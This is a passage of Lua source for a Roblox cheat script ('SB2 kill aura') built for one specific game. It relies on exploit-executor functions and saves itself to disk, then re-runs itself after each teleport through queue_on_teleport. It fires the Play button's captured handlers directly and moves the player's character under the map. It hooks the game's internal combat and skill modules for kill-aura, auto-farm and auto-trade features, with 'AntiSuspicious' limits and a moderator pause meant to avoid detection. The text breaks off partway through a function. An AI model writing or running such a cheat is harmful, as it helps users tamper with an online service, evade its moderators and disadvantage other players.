local SB2_SOURCE=[============[
-- Runtime assembly. Includes share lexical scope; modules below are bundled offline.
local embeddedSource=...
local BUILD="2026-11-07.rubricatus-dodge-v3.0.13"
local VERSION="3.0.13"
if not game:IsLoaded()then game.Loaded:Wait()end
local Players=game:GetService("Players")
local ReplicatedStorage=game:GetService("ReplicatedStorage")
local UserInputService=game:GetService("UserInputService")
local RunService=game:GetService("RunService")
local Stats=game:GetService("Stats")
local HttpService=game:GetService("HttpService")
local TweenService=game:GetService("TweenService")
local player=Players.LocalPlayer
repeat if not player then task.wait(.1);player=Players.LocalPlayer end until player
local env=getgenv()
local previousRuntime=env.SB2KillAura
local previous=(function()
-- BEGIN BUNDLED SETTINGS SNAPSHOT
-- Copy a schema of plain preferences using bounded iterative traversal.
return function(previous,userId)
    if type(previous)~="table"or previous.UserId~=userId then return nil end
    local fields={"AccountProgression","ActiveTab","AtheonDodge","AutoCraft","AutoDismantle","AutoDodge",
        "AutoEquipBestSword","AutoExplore","AutoFarm","AutoHideUI","AutoJoinFriend","AutoSwing","AutoTrade",
        "AutomationResumeFeatures","AutomationRunId","BossOnly","NoSelfDamage","AeganatosDodge","AtheonUnlock","AutoCreateBetween","BetweenRooms","BetweenPace","BetweenAccess","BetweenDifficulty","CreditCheck","CreditWhitelistText","Enabled",
        "HealthHUDPosition","JoinFriendUsername","MiscSkillEnabled","MultiSpot","MultiSpotCursor","MultiSpotOrder",
        "MultiSpotPending","MultiSpotSelected","OffsetProfiles","PerformanceBoosters","ProgressionBossCleared",
        "ProgressionBossClearedName","ProgressionComplete","ProgressionFloor","ProgressionRestore","ResumeFeatures",
        "ResumeRequested","SafeFloorId","SafeMode","SafeWhitelistIds","SafeWhitelistText","AntiSuspicious","AntiSuspiciousLimits","SelectedMiscSkill",
        "SelectedPlayerId","SelectedSkill","SkillAura","SkillPerWeapon","SkillPerWeaponVersion","StopEverything",
        "Theme","TradeItems","TradeMode","UnsafeOffsetProfiles","UserId","ViewingPlayer","ViewingPlayerInventory","WindUIPosition"}
    local result={}
    local budget=4096
    local function primitive(value)
        local kind=type(value)
        return kind=="string"or kind=="number"or kind=="boolean"
    end
    for _,field in ipairs(fields)do
        local value=previous[field]
        if primitive(value)then result[field]=value
        elseif type(value)=="table"then
            local target={};result[field]=target
            local stack={{Source=value,Target=target,Depth=0,Ancestors={[value]=true}}}
            while #stack>0 and budget>0 do
                local work=table.remove(stack)
                for key,item in pairs(work.Source)do
                    if budget==0 then break end
                    if type(key)=="string"or type(key)=="number"then
                        budget-=1
                        if primitive(item)then work.Target[key]=item
                        elseif type(item)=="table"and work.Depth<8 and not work.Ancestors[item]then
                            local child={};work.Target[key]=child
                            local ancestry=table.clone(work.Ancestors);ancestry[item]=true
                            stack[#stack+1]={Source=item,Target=child,Depth=work.Depth+1,Ancestors=ancestry}
                        end
                    end
                end
            end
        end
    end
    if type(previous.UI)=="table"and type(previous.UI.ActiveTab)=="string"then result.ActiveTab=previous.UI.ActiveTab end
    return result
end

-- END BUNDLED SETTINGS SNAPSHOT
end)()(previousRuntime,player.UserId)
local storageBootstrap=(function()
-- BEGIN BUNDLED STORAGE BOOTSTRAP
-- Self-installation is a small journal of idempotent writes, not a reset.
return function(ctx)
    local directory="SB2Codex"
    local stable=directory.."/kill-aura.luau"
    local versioned=type(ctx.Build)=="string"and directory.."/source_"..ctx.Build:gsub("[^%w_-]","_")..".luau"or stable
    local entry=type(ctx.Source)=="string"and ctx.Prefix..ctx.Source..ctx.Suffix or nil
    local api={Ready=false,Generation=0,Created={},SourcePath=versioned}
    local installed=false
    local function write(path,text)
        ctx.Write(path,text)
        api.Generation+=1;api.Created[path]=true
    end
    local function source(path,inspect)
        local exists=ctx.IsFile(path)
        if not exists or (inspect and ctx.Read(path)~=entry)then write(path,entry)end
    end
    local function directoryReady()
        if ctx.IsFolder then
            if ctx.IsFolder(directory)then return end
            assert(type(ctx.MakeFolder)=="function","This executor cannot create SB2Codex")
            local ok,reason=pcall(ctx.MakeFolder,directory)
            assert(ok or ctx.IsFolder(directory),tostring(reason))
        elseif ctx.MakeFolder then pcall(ctx.MakeFolder,directory)end
    end
    local function newFile(path,value)
        if not ctx.IsFile(path)then write(path,ctx.Encode(value))end
    end
    local function synchronize(verify)
        for _,name in ipairs({"IsFile","Read","Write"})do
            assert(type(ctx[name])=="function","This executor does not provide file storage for automatic rejoin")
        end
        assert(entry,"Run the complete kill-aura.luau entry to install automatic rejoin")
        directoryReady()
        if not installed or not ctx.IsFile(stable)or (verify and stable==versioned)then source(stable,true);installed=true end
        if versioned~=stable then source(versioned,verify==true)end
        newFile(directory.."/settings_"..ctx.UserId..".json",{Version=1})
        newFile(directory.."/solo-search_"..ctx.UserId..".json",{Version=1,Active=false,UserId=ctx.UserId,PlaceId=ctx.PlaceId})
    end
    function api.Ensure(verify)
        local ok,reason=pcall(synchronize,verify)
        api.Ready=ok;api.Error=not ok and tostring(reason)or nil
        return api.Ready,api.Error
    end
    api.Ensure(true)
    return api
end

-- END BUNDLED STORAGE BOOTSTRAP
end)()({Build=BUILD,Source=embeddedSource,UserId=player.UserId,PlaceId=game.PlaceId,
    Prefix="local SB2_SOURCE=["..string.rep("=",12).."[\n",
    Suffix="]"..string.rep("=",12).."]\nreturn assert(loadstring(SB2_SOURCE, \"SB2\"))(SB2_SOURCE)\n",
    IsFile=isfile,Read=readfile,Write=writefile,IsFolder=isfolder,MakeFolder=makefolder,
    Encode=function(value)return HttpService:JSONEncode(value)end})
env.SB2StorageBootstrap=storageBootstrap
local playerGui=player:WaitForChild("PlayerGui")
local runtimeOwner=(function()
-- BEGIN BUNDLED RUNTIME OWNER
-- GUI ownership is shared across executor environments through instance attributes.
return function(context)
    local rootName="SB2KillAuraUI"
    local obsolete={}
    local incumbent
    local timestamp=context.Now()
    local function fresh(candidate)
        local phase=candidate:GetAttribute("SB2Phase")
        local heartbeat=candidate:GetAttribute("SB2Heartbeat")
        return candidate:GetAttribute("SB2Build")==context.Build
            and candidate:GetAttribute("SB2Job")==context.Job
            and (phase=="Loading"or phase=="Running")
            and type(heartbeat)=="number"and timestamp-heartbeat<10
    end
    for _,candidate in ipairs(context.Parent:GetChildren())do
        if candidate.Name==rootName and candidate:IsA("ScreenGui")then
            if incumbent==nil and fresh(candidate)then incumbent=candidate
            else obsolete[#obsolete+1]=candidate end
        end
    end
    local function discardObsolete()
        for index=#obsolete,1,-1 do local candidate=obsolete[index];obsolete[index]=nil;pcall(function()candidate:Destroy()end)end
    end
    if incumbent then discardObsolete();return nil,incumbent end
    local root=context.Create();root.Name=rootName
    for name,value in pairs({SB2Build=context.Build,SB2Job=context.Job,SB2Phase="Loading",SB2Heartbeat=timestamp})do
        root:SetAttribute(name,value)
    end
    root.Parent=context.Parent
    local lease={Root=root}
    local released=false
    local pulse
    local due=timestamp+2
    function lease.Alive()return not released and root.Parent==context.Parent end
    lease.Retire=discardObsolete
    function lease.Ready()if lease.Alive()then root:SetAttribute("SB2Phase","Running")end end
    function lease.Release()
        if released then return end
        released=true
        if pulse then pulse:Disconnect();pulse=nil end
        pcall(function()root:SetAttribute("SB2Phase","Stopped")end)
    end
    pulse=context.Pulse:Connect(function()
        if released then return end
        if root.Parent~=context.Parent then lease.Release();return end
        local now=context.Now()
        if now>=due then due=now+2;root:SetAttribute("SB2Heartbeat",now)end
    end)
    return lease
end

-- END BUNDLED RUNTIME OWNER
end)()({Build=BUILD,Job=game.JobId,Parent=playerGui,Pulse=RunService.Heartbeat,Now=os.clock,
    Create=function()
        local root=Instance.new("ScreenGui")
        root.ResetOnSpawn=false;root.DisplayOrder=100;root.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
        return root
    end})
if not runtimeOwner then return end
local loadToken={}
env.SB2LoadToken=loadToken
local function startupCurrent()
    return env.SB2LoadToken==loadToken and runtimeOwner.Alive()
end
if game.PlaceId==659222129 and game.GameId==212154879 then
    local makeLobby=(function()
-- BEGIN BUNDLED LOBBY PLAY
-- Observe readiness, queue recovery once, then pace attempts until the menu leaves.
return function(ctx)
    local api={Attempts=0,Done=false}
    local expires=ctx.Now()+60
    local nextActivation=0
    local prepared=false
    local function call(fn,...)
        local ok,result=pcall(fn,...)
        if not ok then api.Error=tostring(result);api.Done=true end
        return ok,result
    end
    function api.Update()
        if api.Done then return end
        local now=ctx.Now()
        if now>=expires or not ctx.Alive() then api.Done=true;return end
        local button=ctx.Find()
        if not button or not ctx.Ready(button) then
            api.Done=api.Attempts>0
            return
        end
        if now<nextActivation then return end
        nextActivation=now+1
        if not prepared then
            if not call(ctx.Queue) then return end
            prepared=true
        end
        local ok,activated=call(ctx.Activate,button)
        if ok and activated~=false then api.Attempts=api.Attempts+1 end
    end
    return api
end

-- END BUNDLED LOBBY PLAY
    end)()
    local function findPlay()
        local node=playerGui:FindFirstChild("ScreenGui")
        for _,name in ipairs({"Frame","Buttons","Play"})do node=node and node:FindFirstChild(name)end
        return node
    end
    local function playReady(button)
        if not(button:IsA("GuiButton")and button.Active and button.Visible)then return false end
        if button.Position.Y.Scale==0 and button.Position.Y.Offset<0 then return false end
        local node=button.Parent
        while node and node~=playerGui do
            if(node:IsA("GuiObject")and not node.Visible)or(node:IsA("ScreenGui")and not node.Enabled)then return false end
            node=node.Parent
        end
        local camera=workspace.CurrentCamera
        if not camera then return false end
        local point,extent=button.AbsolutePosition,button.AbsoluteSize
        return extent.X>0 and extent.Y>0 and point.X>=0 and point.Y>=0
            and point.X+extent.X<=camera.ViewportSize.X and point.Y+extent.Y<=camera.ViewportSize.Y
    end
    local function queueLobby()
        local ready,reason=storageBootstrap.Ensure();assert(ready,reason)
        local queue=queue_on_teleport or queueonteleport or(syn and syn.queue_on_teleport)or(fluxus and fluxus.queue_on_teleport)
        assert(type(queue)=="function","Auto Play requires teleport queue support")
        assert(type(readfile)=="function"and type(isfile)=="function"and isfile("SB2Codex/kill-aura.luau"),"Saved source is unavailable")
        queue(string.format([==[
if not game:IsLoaded()then game.Loaded:Wait()end
local p=game:GetService("Players").LocalPlayer
while not p do task.wait();p=game:GetService("Players").LocalPlayer end
if p.UserId==%s and game.GameId==212154879 and isfile("SB2Codex/kill-aura.luau")then
    local code=readfile("SB2Codex/kill-aura.luau")
    if code:find(%q,1,true)then assert(loadstring(code))()end
end
]==],tostring(player.UserId),BUILD))
    end
    local lobby=makeLobby({Now=os.clock,Alive=startupCurrent,Find=findPlay,Ready=playReady,Queue=queueLobby,
        Activate=function(button)
            assert(type(getconnections)=="function","Native Play activation is unavailable")
            local count=0
            for _,listener in ipairs(getconnections(button.MouseButton1Click))do
                if listener.Enabled~=false and type(listener.Function)=="function"then task.spawn(listener.Function);count+=1 end
            end
            return count>0
        end})
    env.SB2LobbyPlay=lobby
    while not lobby.Done and startupCurrent()do lobby.Update();if not lobby.Done then task.wait(.25)end end
    runtimeOwner.Release();runtimeOwner.Root:Destroy()
    return
end
local configFolder="SB2Codex"
local configPath=configFolder.."/settings_"..player.UserId..".json"
local configData,configLoadError={},nil
local filePersistence=type(readfile)=="function"and type(writefile)=="function"and type(isfile)=="function"
if filePersistence and isfile(configPath)then
    local ok,value=pcall(function()
        local text=readfile(configPath)
        assert(#text<=32768,"Settings file exceeds its size limit")
        local decoded,settings=pcall(HttpService.JSONDecode,HttpService,text)
        if decoded and type(settings)=="table"and settings.Version==1 then return settings end
        if not isfile(configPath..".bak")then writefile(configPath..".bak",text)end
        error("Invalid settings backed up; defaults restored")
    end)
    if ok then configData=value else configLoadError=tostring(value)end
end
local sharedSettings,sharedPreferences=nil,{}
if filePersistence then
    local attachShared=(function()
-- BEGIN BUNDLED SHARED SETTINGS
-- Merge only this account's changed preference fields into the latest shared file.
return function(ctx)
    local file="SB2Codex/shared-settings.json"
    local fields={"NoSelfDamage","AeganatosDodge","AtheonUnlock","AutoCreateBetween","BetweenRooms","BetweenPace","BetweenAccess","BetweenDifficulty","CreditCheck","CreditWhitelistText","AutoCraft","AutoTrade","TradeMode","TradeItems","AutoDismantle","AutoEquipBestSword","Enabled","AutoFarm","BossOnly","AutoSwing","SkillAura","SelectedSkill","SkillPerWeapon","SkillPerWeaponVersion",
        "MiscSkillEnabled","SelectedMiscSkill","AutoDodge","AtheonDodge","TransparentMap","PerformanceBoosters","AutoJoinFriend","JoinFriendUsername","SafeMode","SafeFloorId","SafeWhitelistText","SafeWhitelistIds","AntiSuspicious","AntiSuspiciousLimits","MultiSpot","MultiSpotSelected","MultiSpotOrder","Theme","AccountProgression","PanelPosition","HealthHUDPosition","WindUIPosition","AutoHideUI"}
    local function project(settings)
        local result={Version=1}
        for _,name in ipairs(fields)do result[name]=settings[name]end
        return result
    end
    local function decode(path)
        local bytes=ctx.Read(path)
        assert(#bytes<=32768,"Settings file exceeds its size limit")
        local value=ctx.Decode(bytes)
        assert(type(value)=="table"and value.Version==1,"Invalid shared settings")
        return project(value)
    end
    local function rank(settings)
        local whitelist=type(settings.SafeWhitelistText)=="string"and settings.SafeWhitelistText:find("%S")
        local points=whitelist and 1000 or 0
        for key,weight in pairs({SafeMode=10,AccountProgression=5,Enabled=1,AutoFarm=1})do if settings[key]==true then points+=weight end end
        return points
    end
    local function migrate()
        local best=ctx.Current or {}
        if ctx.List and rank(best)<1000 then
            local ok,paths=pcall(ctx.List,"SB2Codex")
            if ok and type(paths)=="table"then
                table.sort(paths)
                for i=1,math.min(200,#paths)do
                    if paths[i]:match("settings_%d+%.json$")then
                        local readable,candidate=pcall(decode,paths[i])
                        if readable and rank(candidate)>rank(best)then best=candidate end
                    end
                end
            end
        end
        local value=project(best);ctx.Write(file,ctx.Encode(value));return value
    end
    local api={Values=ctx.IsFile(file)and decode(file)or migrate()}
    if api.Values.SafeFloorId==nil and ctx.Current and type(ctx.Current.SafeFloorId)=="number"then
        api.Values.SafeFloorId=ctx.Current.SafeFloorId;ctx.Write(file,ctx.Encode(api.Values))
    end
    local function fingerprint(settings)
        local result={}
        for _,name in ipairs(fields)do result[name]=ctx.Encode({Value=settings[name]})end
        return result
    end
    local localRevision=fingerprint(api.Values)
    function api.ReadSafeFloor()
        if ctx.IsFile(file)then return tonumber(decode(file).SafeFloorId)end
        return nil
    end
    function api.Save(settings)
        local nextLocal=project(settings)
        local revision=fingerprint(nextLocal)
        local edits={}
        for _,name in ipairs(fields)do if revision[name]~=localRevision[name]then edits[#edits+1]=name end end
        local exists=ctx.IsFile(file)
        if exists and #edits==0 then return end
        local merged=exists and decode(file)or project(api.Values)
        for _,name in ipairs(edits)do merged[name]=nextLocal[name]end
        ctx.Write(file,ctx.Encode(merged))
        localRevision=revision;api.Values=merged
    end
    return api
end

-- END BUNDLED SHARED SETTINGS
    end)()
    local ok,value=pcall(attachShared,{Current=configData,IsFile=isfile,Read=readfile,Write=writefile,List=listfiles,
        Encode=function(data)return HttpService:JSONEncode(data)end,Decode=function(text)return HttpService:JSONDecode(text)end})
    if ok then sharedSettings=value;sharedPreferences=value.Values else configLoadError=tostring(value)end
end
local importedConfig=env.SB2ConfigImport
env.SB2ConfigImport=nil
if type(importedConfig)~="table"or importedConfig.UserId~=player.UserId then importedConfig=nil end
local function preference(key,fallback)
    if importedConfig then local value=importedConfig.Settings[key];if value~=nil then return value end;return fallback end
    local sources={sharedPreferences,previous and previous.StopEverything and previous.ResumeFeatures or {},previous or {},configData}
    if key=="StopEverything"and previous and previous.ResumeRequested then return false end
    for _,source in ipairs(sources)do if source[key]~=nil then return source[key]end end
    return fallback
end
local function numericPreference(key,fallback,minimum,maximum)
    local number=tonumber(preference(key,fallback))
    if not number or number~=number or math.abs(number)==math.huge then number=fallback end
    return math.clamp(number,minimum,maximum)
end
local restore={Radius=30,SkillRange=30,FarmRange=math.huge,Threat=3}
local booleanDefaults={Enabled=false,AutoSwing=true,AutoTrade=false,AutoEquipBestSword=true,AutoFarm=false,BossOnly=false,
    CreditCheck=false,SkillAura=false,MiscSkillEnabled=false,ViewingPlayer=false,ViewingPlayerInventory=false,
    AutoExplore=true,AutoDodge=true,NoSelfDamage=false,AeganatosDodge=false,AtheonDodge=false,AtheonUnlock=false,AutoCreateBetween=false,AutoJoinFriend=false,SafeMode=false,MultiSpot=false,
    AccountProgression=false,ProgressionBossCleared=false,ProgressionComplete=false,AntiSuspicious=false}
for key,fallback in pairs(booleanDefaults)do restore[key]=preference(key,fallback)==true end
local textDefaults={BetweenAccess="Private",BetweenDifficulty="Normal",TradeMode="Selected",CreditWhitelistText="",SelectedMiscSkill="Cursed Enhancement",JoinFriendUsername="",SafeWhitelistText=""}
for key,fallback in pairs(textDefaults)do restore[key]=preference(key,fallback)end
for _,key in ipairs({"BetweenRooms","BetweenPace","AntiSuspiciousLimits","TradeItems","AutoCraft","AutoDismantle","PerformanceBoosters","SafeWhitelistIds","MultiSpotSelected","MultiSpotOrder"})do
    local value=preference(key,{})
    restore[key]=type(value)=="table"and value or {}
end
for _,key in ipairs({"SelectedPlayerId","MultiSpotCursor","MultiSpotPending","ProgressionBossClearedName","ProgressionRestore","AutomationRunId","AutomationResumeFeatures"})do
    restore[key]=preference(key,nil)
end
restore.Skill=preference("SelectedSkill","Piercing Dash")
if type(restore.Skill)~="string"then restore.Skill="Piercing Dash"end
restore.SafeFloorId=tonumber(preference("SafeFloorId",game.PlaceId))or game.PlaceId
restore.ProgressionFloor=math.floor(numericPreference("ProgressionFloor",1,1,12))
if type(restore.ProgressionRestore)~="table"then restore.ProgressionRestore=nil end
if restore.ProgressionFloor~=12 then restore.ProgressionComplete=false end
if previousRuntime and previousRuntime.Destroy then
    local ok,reason=pcall(previousRuntime.Destroy,true)
    if not ok then previousRuntime.Running=false;env.SB2LastReplacementError=tostring(reason);warn("[SB2] Continuing after cleanup failure: "..tostring(reason))end
end
previousRuntime=nil
runtimeOwner.Retire()
local recoveryUntil=env.SB2FarmRecoveryUntil
if type(recoveryUntil)=="number"and recoveryUntil>os.clock()then task.wait(math.min(3,recoveryUntil-os.clock()))end
local releaseStartupHold
if game.PlaceId~=78945654064532 then
    local moveBelow=(function()
-- BEGIN BUNDLED STARTUP BELOW
-- The startup transaction owns exactly one checked ground-relative placement.
return function(ctx)
    local expires=ctx.Now()+8
    while ctx.Alive()do
        local characterRoot=ctx.Root()
        if characterRoot then
            local at=ctx.Position(characterRoot)
            local ground=ctx.Surface(characterRoot,at)
            assert(type(ground)=="number"and ground==ground and math.abs(ground)<1e8,"Startup ground height is unavailable")
            if not ctx.Alive()or ctx.Root()~=characterRoot then return false,"Character changed during startup"end
            ctx.Move(characterRoot,at.X,at.Y<ground-2 and at.Y or ground-20,at.Z,ground)
            return true
        end
        if ctx.Now()>=expires then return false,"Waiting for a living character timed out"end
        ctx.Sleep(.05)
    end
    return false,"Startup cancelled"
end

-- END BUNDLED STARTUP BELOW
    end)()
    local ok,moved,reason=pcall(moveBelow,{Now=os.clock,Sleep=task.wait,
        Alive=function()return env.SB2LoadToken==loadToken and runtimeOwner.Alive()end,
        Root=function()
            local character=player.Character
            local humanoid=character and character:FindFirstChildOfClass("Humanoid")
            return humanoid and humanoid.Health>0 and character:FindFirstChild("HumanoidRootPart")or nil
        end,
        Position=function(root)return root.Position end,
        Surface=function(root,point)
            local params=RaycastParams.new();params.FilterType=Enum.RaycastFilterType.Exclude;params.RespectCanCollide=true
            local excluded={root.Parent}
            for _,name in ipairs({"Mobs","Characters","CharacterItems","HitEffects","MobSpawnEffects"})do
                local folder=workspace:FindFirstChild(name);if folder then excluded[#excluded+1]=folder end
            end
            params.FilterDescendantsInstances=excluded
            local hit=workspace:Raycast(point+Vector3.new(0,64,0),Vector3.new(0,-256,0),params)
            if not hit then
                hit=workspace:Raycast(point+Vector3.new(0,192,0),Vector3.new(0,-384,0),params)
            end
            if hit then return hit.Position.Y end
            local humanoid=root.Parent:FindFirstChildOfClass("Humanoid")
            return point.Y-(humanoid and humanoid.HipHeight or 2)-root.Size.Y/2
        end,
        Move=function(root,x,y,z,floor)
            local character=root.Parent
            local humanoid=character:FindFirstChildOfClass("Humanoid")
            local destination=Vector3.new(x,y,z)
            local standing=Vector3.new(x,math.max(root.Position.Y,floor+humanoid.HipHeight+root.Size.Y/2+.5),z)
            local pin=Instance.new("Attachment");pin.Name="SB2StartupAttachment"
            local hold=Instance.new("AlignPosition")
            hold.Name="SB2StartupPosition";hold.Mode=Enum.PositionAlignmentMode.OneAttachment
            hold.Attachment0=pin;hold.Position=destination;hold.ApplyAtCenterOfMass=true;hold.RigidityEnabled=true
            local observers={};local released=false
            local function release(restore)
                if released then return end
                released=true;releaseStartupHold=nil
                for index=#observers,1,-1 do observers[index]:Disconnect();observers[index]=nil end
                hold:Destroy();pin:Destroy()
                if restore and root.Parent==character and player.Character==character and humanoid.Health>0
                    and(root.Position-destination).Magnitude<8 then
                    root.CFrame=CFrame.new(standing)*root.CFrame.Rotation;root.AssemblyLinearVelocity=Vector3.zero
                end
            end
            releaseStartupHold=release
            local function manualMotion()if humanoid.MoveDirection.Magnitude>.05 or humanoid.Jump then release(true)end end
            for _,property in ipairs({"MoveDirection","Jump"})do observers[#observers+1]=humanoid:GetPropertyChangedSignal(property):Connect(manualMotion)end
            observers[#observers+1]=player.CharacterRemoving:Connect(function(removing)if removing==character then release(false)end end)
            observers[#observers+1]=runtimeOwner.Root.Destroying:Connect(function()release(true)end)
            pin.Parent=root;hold.Parent=root
            if(root.Position-destination).Magnitude>.01 then root.CFrame=CFrame.new(destination)*root.CFrame.Rotation end
            root.AssemblyLinearVelocity=Vector3.zero;root.AssemblyAngularVelocity=Vector3.zero
        end})
    if not ok and releaseStartupHold then releaseStartupHold(true)end
    env.SB2StartupBelowResult={Build=BUILD,Moved=ok and moved==true,Error=not ok and tostring(moved)or (not moved and reason or nil)}
else
    env.SB2StartupBelowResult={Build=BUILD,Moved=false,Reason="The Between"}
end
if not startupCurrent()then return end
local profile=ReplicatedStorage:WaitForChild("Profiles"):WaitForChild(player.Name)
for _,name in ipairs({"Inventory","Locations"})do profile:WaitForChild(name)end
local services=ReplicatedStorage:WaitForChild("CardinalClient"):WaitForChild("MainModule")
require(services)
services=services:WaitForChild("Services")
if not startupCurrent()then runtimeOwner.Release();return end
local Combat=require(services.Combat)
local Actions=require(services.Actions)
local Skills=require(services.Skills)
local GameUI=require(services.UI)
local CanRunSkill=require(ReplicatedStorage.Shared.Util.CanRunSkill)
if not startupCurrent()then runtimeOwner.Release();return end
local state={
    Build=BUILD,Version=VERSION,UserId=player.UserId,Running=true,StopEverything=false,
    Enabled=false,AutoFarm=false,SkillAura=false,MiscSkillEnabled=false,
    Radius=30,SkillRange=30,FarmRange=math.huge,Threat=3,OffsetMode="Below",FarmAbove=false,
    AttackInterval=.3,AttackBurstInterval=.3,SkillBurstInterval=.3,EffectiveInterval=.3,
    ThreatCycle=.12,MaxRequestsPerSecond=48,Backoff=1,TeleportInterval=.18,TeleportOffset=-6,
    AutoOffset=true,HideSkillAnimation=true,
    OffsetStatus="Waiting for a target",MovementStatus="Auto farm is off",LastTarget="None",
    SkillStatus="Skill aura is off",ProtectionStatus="Retreat on health loss",ProgressionPhase="Loading",
    AverageFrameTime=1/60,AverageLoopCost=0,ConfigPath=configPath,ConfigLoadError=configLoadError,
    ConfigLoadedFromDisk=configData.Version==1,StorageBootstrap=storageBootstrap,
    SavedScriptPath=storageBootstrap.SourcePath or(configFolder.."/kill-aura.luau"),
    Theme=preference("Theme","Dark"),AutoHideUI=preference("AutoHideUI",false)==true,
    SelectedMiscSkill=type(restore.SelectedMiscSkill)=="string"and restore.SelectedMiscSkill or "Cursed Enhancement",
    SelectedSkill=restore.Skill,SkillPerWeapon=preference("SkillPerWeapon",{}),SkillPerWeaponVersion=preference("SkillPerWeaponVersion",0),
    ProgressionBossClearedName=type(restore.ProgressionBossClearedName)=="string"and restore.ProgressionBossClearedName or nil,
    SharedSafeFloorId=restore.SafeFloorId,
    AutoSaveStatus=filePersistence and "Auto-save · ready"or "Auto-save · file access unavailable",
}
for _,key in ipairs({"CreditCheck","CreditWhitelistText","BossOnly","AutoSwing","AutoTrade","TradeMode","AutoEquipBestSword",
    "AutoExplore","AutoDodge","NoSelfDamage","AeganatosDodge","AtheonDodge","AtheonUnlock","AutoCreateBetween","BetweenRooms","BetweenPace","BetweenAccess","BetweenDifficulty","AutoJoinFriend","JoinFriendUsername","SafeMode","SafeFloorId",
    "SafeWhitelistText","SafeWhitelistIds","AntiSuspicious","AntiSuspiciousLimits","MultiSpot","MultiSpotSelected","MultiSpotOrder","MultiSpotCursor","MultiSpotPending",
    "AutomationRunId","AutomationResumeFeatures","AccountProgression","ProgressionFloor","ProgressionBossCleared","ProgressionComplete","ProgressionRestore"})do
    state[key]=restore[key]
end
for _,key in ipairs({"TradeItems","AutoCraft","AutoDismantle","PerformanceBoosters"})do
    state[key]=type(restore[key])=="table"and restore[key]or {}
end
for _,key in ipairs({"HitsSent","BurstsSent","LastBurstSize","BurstProgress","SwingStarts","LagPauseUntil","ProtectionRetreats",
    "TeleportsSent","TargetScans","MiscSkillRequests","MiscSkillCasts","SkillWeaponVersion","SkillCasts","HealthUpdates",
    "HiddenSkillAnimations","HiddenSkillEffects","SkillHitRequests","LastSkillBurstSize","ExploreHops"})do state[key]=0 end
for _,key in ipairs({"AttackBurstActive","SwordSwinging","Recovering","Moving","MiscCastRunning","MiscReserveStamina","Exploring","Dodging"})do state[key]=false end
state.AttackBurstHistory={};state.SkillBurstHistory={}
local function savedOffsets(key,positive)
    local result={};local total=0
    local input=preference(key,{})
    if type(input)~="table"then return result end
    for signature,value in pairs(input)do
        local valid=type(signature)=="string"and #signature<200 and signature:find(":offset-v6:",1,true)
            and type(value)=="number"and value==value and math.abs(value)<math.huge
        if valid and ((positive and value>0)or(not positive and value<0))then
            result[signature]=value;total+=1
            if total==32 then break end
        end
    end
    return result
end
state.OffsetProfiles=savedOffsets("OffsetProfiles",false)
state.UnsafeOffsetProfiles=savedOffsets("UnsafeOffsetProfiles",true)
function state.FarmClock()
    local ok,value=pcall(workspace.GetServerTimeNow,workspace)
    if ok and type(value)=="number"then return value end
    return os.clock()
end
do
    local factory=(function()
-- BEGIN BUNDLED FARM COORDINATION
-- Server-clock beats and roster-indexed formation slots require no external service.
return function(ctx)
    local api={}
    local beats={}
    local formation={Due=0,Index=1,Count=1}
    local holds=setmetatable({}, {__mode="k"})
    function api.Ready(channel)
        local beat=math.floor(ctx.Now()*4)
        local seen=beats[channel]
        if seen==nil then beats[channel]=beat;return false end
        if beat<=seen then return false end
        beats[channel]=beat;return true
    end
    local function quantize(value)return math.floor(value*2+.5)/2 end
    function api.Position(point)return ctx.Vector(quantize(point.X),quantize(point.Y),quantize(point.Z))end
    local function refreshRoster(now)
        if formation.Roster and now<formation.Due then return end
        local roster=ctx.Members()
        table.sort(roster,function(a,b)return a.UserId<b.UserId end)
        formation.Roster=roster;formation.Due=now+1;formation.Count=math.max(1,#roster);formation.Index=1
        for index,person in ipairs(roster)do if person.UserId==ctx.UserId then formation.Index=index;break end end
    end
    function api.Spread(point,target,center,reach)
        if not ctx.Members then return point end
        refreshRoster(ctx.Now())
        local count,index=formation.Count,formation.Index
        local sine=count>1 and math.sin(math.pi/count)or 0
        local radius=count>1 and math.min(12,2/sine)or 0
        if center and reach then
            local vertical=math.abs(point.Y-center.Y)+.5
            local usable=math.max(0,reach-1)
            radius=math.max(0,math.min(radius,math.sqrt(math.max(0,usable*usable-vertical*vertical))-.5))
        end
        local angle=(index-1)*2*math.pi/count
        local proposed=api.Position(ctx.Vector(point.X+math.cos(angle)*radius,point.Y,point.Z+math.sin(angle)*radius))
        local old=holds[target]
        if old and old.Index==index and old.Count==count then
            local delta=(proposed.X-old.Point.X)^2+(proposed.Y-old.Point.Y)^2+(proposed.Z-old.Point.Z)^2
            if delta<.5625 then return old.Point end
        end
        holds[target]={Point=proposed,Index=index,Count=count}
        api.Slot=index;api.Count=count;api.Spacing=2*radius*sine
        return proposed
    end
    function api.Deadline(killedAt,seconds)return math.ceil((killedAt+seconds)*2)/2 end
    return api
end

-- END BUNDLED FARM COORDINATION
    end)()
    state.FarmCoordination=factory({Now=state.FarmClock,Vector=Vector3.new,UserId=player.UserId,Members=function()return Players:GetPlayers()end})
end
env.SB2KillAura=state
local connections={}
local lastHit=setmetatable({}, {__mode="k"})
local pendingDamage=setmetatable({}, {__mode="k"})
local candidates={}
local consecutiveErrors,nextTargetRefresh,nextPingCheck=0,0,0
local candidatePrimary
local configReady=false
local requestSave=function()end
local enemyHUD
local combatStatus="Paused"
local stopMovement=function()end
local normalScheduler=(function()
-- BEGIN BUNDLED ATTACK SCHEDULER
-- Normal-hit admission combines a global token bucket with target-local deadlines.
return function(state)
    local api={}
    local deadlines=setmetatable({}, {__mode="k"})
    local context,closed
    local bucket={Balance=4,At=os.clock(),ReserveAt=0}
    local function blocked()
        return closed or state.StopEverything or state.SafeModePanic or state.ModeratorBlocking or state.AutoTradeBusy
    end
    function api.Bind(adapter)context=adapter end
    function api.Next(target)return deadlines[target]or 0 end
    function api.Ready(target,now)return now>=api.Next(target)end
    function api.Mark(target,now,delay)deadlines[target]=now+math.max(.3,delay or 0)end
    function api.Cancel(reason)
        state.AttackBurstActive=false
        state.ThreatReason=reason or "Paused"
    end
    function api.Destroy()
        closed=true;api.Cancel("Script closed");table.clear(deadlines);context=nil
    end
    local function admissible(target,now,root,folder)
        if not api.Ready(target,now)or target.Parent~=folder then return nil end
        if state.SkillRegistrationTarget and not state.Enabled and target~=state.SkillRegistrationTarget then return nil end
        local data=context.GetData(target)
        if not data or data.Health.Value<=0 or (data.HitLives and data.HitLives.Value<=0)then return nil end
        if data.Entity:FindFirstChild("Immortal")then return nil end
        local delta=context.Delta and context.Delta(data,root)or data.Root.Position-root.Position
